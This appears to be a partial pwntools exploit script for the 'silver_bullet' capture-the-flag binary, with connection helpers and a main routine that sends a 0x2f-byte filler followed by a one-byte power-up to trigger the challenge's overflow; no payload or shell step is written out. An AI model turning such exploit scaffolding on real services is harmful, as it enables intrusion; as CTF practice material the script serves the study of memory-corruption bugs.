from pwn import *

elf = ELF("./silver_bullet_patched")
libc = ELF("./libc.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("addr", 1337)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdb_args=["-x", "./.gdbinit"], gdbscript="""
                b *main+48
                """)
        else:
            p = process([elf.path])

    return p

def menu(p):
    p.recvuntil(b"Your choice :")

def create(p, desc: bytes):
    menu(p)
    p.send(b"1")
    p.sendafter(b"bullet :", desc)
    p.recvuntil(b"is : ")
    return p.recvline().strip()

def power_up(p, desc):
    menu(p)
    p.send(b"2")
    p.sendafter(b"bullet :", desc)
    p.recvuntil(b"is : ")
    return p.recvline().strip()

def main():
    p = conn()

    # pwn it
    power = int(create(p, b"A"*(0x30 - 1)))
    log.info(f"{power = }")

    power = int(power_up(p, b"A"))
    log.info(f"{power = }")
    

    p.interactive()

if __name__ == '__main__':
    main()
